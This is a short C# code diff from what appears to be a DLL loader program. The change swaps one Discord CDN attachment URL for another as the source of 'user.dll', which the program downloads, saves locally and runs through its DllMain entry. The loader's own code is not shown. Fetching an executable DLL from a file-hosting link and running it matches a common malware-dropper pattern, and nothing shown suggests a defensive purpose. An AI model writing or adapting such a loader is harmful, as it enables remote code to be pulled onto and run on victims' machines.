@@ -33,7 +33,7 @@ namespace loader {
 
         public static void Main(string[] args) {
 
-            string remoteDllUrl = "https://cdn.discordapp.com/attachments/804752207312322571/947637812415582218/user.dll";
+            string remoteDllUrl = "https://cdn.discordapp.com/attachments/804752207312322571/947659562536816701/user.dll";
             string localDllName = "user.dll";
             string dllEntryName = "DllMain";
             DllLoader(remoteDllUrl, localDllName, dllEntryName);
